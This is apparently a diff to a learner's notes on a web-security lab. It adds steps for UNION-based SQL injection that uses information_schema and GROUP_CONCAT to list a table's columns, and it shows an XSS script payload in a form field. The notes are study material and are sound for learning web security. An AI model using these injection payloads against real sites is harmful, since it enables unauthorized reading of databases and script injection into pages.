@@ -152,4 +152,11 @@ email=<script>alert("Succ3ssful%2bXSS")</script>&content=hack+test
     <code>SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'</code>
 </code>
 ```
-- 
+- The INFORMATION_SCHEMA Database: “This is the database about databases. It’s used to store details of other databases on the server”.
+
+- ``` /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people" ```
+- this requey can only retrieve one column_nmae of the people table.
+- MySQL GROUP_CONCAT() function returns a string with concatenated non-NULL value from a group.
+- Notice that we also changed the ID that we are selecting from 2 to 0. By setting the ID to an invalid number, we  ensure that we don't retrieve anything with the original (legitimate) query; this means that the first row returned from the database will be our desired response from the injected query.
+- ``` /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people" ```
+- retrieve all columns name of people table.
